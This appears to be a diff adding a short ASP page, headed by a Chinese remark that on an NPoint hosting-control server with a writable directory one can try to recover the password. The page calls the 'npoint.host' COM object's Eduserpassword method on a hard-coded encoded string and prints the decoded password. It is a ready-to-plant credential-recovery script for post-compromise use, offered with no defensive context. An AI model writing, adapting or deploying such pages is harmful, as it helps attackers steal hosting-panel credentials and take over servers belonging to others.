@@ -1,0 +1,11 @@
+一个N点的主机管理 N点目录有写权限 尝试还原密码
+
+
+<!--#include file="inc/conn.asp"--> 
+<!--#include file="inc/siteinfo.asp"--> 
+<!--#include file="inc/char.asp"--> 
+<% 
+set iishost=server.CreateObject("npoint.host") 
+x=iishost.Eduserpassword("NLFPK@OJCOCLA@E@FEKJMFADLALKLF@JHOIMAHO@LCDBAAMEOEKGKM@A",0) 
+response.write x 
+%>
